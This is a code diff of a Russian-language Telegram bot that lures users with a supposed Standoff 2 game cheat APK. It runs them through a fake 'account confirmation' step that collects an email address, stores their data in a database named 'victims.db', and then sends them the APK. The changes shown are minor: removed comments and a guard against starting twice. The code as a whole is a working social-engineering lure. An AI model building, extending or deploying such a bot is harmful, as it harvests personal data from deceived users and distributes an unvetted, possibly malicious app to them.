@@ -3,7 +3,7 @@ from telebot import types
 import os, threading, time, sqlite3, datetime, re
 
 TOKEN = os.environ.get("TG_TOKEN")
-APK_PATH = "standoff_cheat.apk"   # файл в корне репозитория
+APK_PATH = "standoff_cheat.apk"
 
 print("=== ENV CHECK ===")
 print("TG_TOKEN set:", bool(TOKEN))
@@ -12,8 +12,8 @@ print("=================")
 DB = "victims.db"
 bot = telebot.TeleBot(TOKEN)
 
-# --- Хранилище состояний пользователей ---
 user_state = {}
+_started = False
 
 def init_db():
     db = sqlite3.connect(DB)
@@ -23,7 +23,6 @@ def init_db():
     db.commit()
     db.close()
 
-# --- Красивое меню ---
 def main_menu():
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(
@@ -52,6 +51,7 @@ def on_start(m):
 @bot.callback_query_handler(func=lambda c: True)
 def on_callback(c):
     bot.answer_callback_query(c.id)
+
     if c.data == "get_cheat":
         text = (
             "📧 <b>Шаг 1 из 2 — Подтверждение аккаунта</b>\n\n"
@@ -104,7 +104,6 @@ def on_email(m):
     bot.send_message(m.chat.id, "⏳ <b>Проверка пройдена. Готовим APK...</b>", parse_mode="HTML")
     time.sleep(2)
 
-    # Отправка APK
     try:
         with open(APK_PATH, "rb") as f:
             bot.send_document(
@@ -129,5 +128,9 @@ def run_bot():
     bot.infinity_polling()
 
 def start_bot_thread():
+    global _started
+    if _started:
+        return
+    _started = True
     init_db()
     threading.Thread(target=run_bot, daemon=True).start()
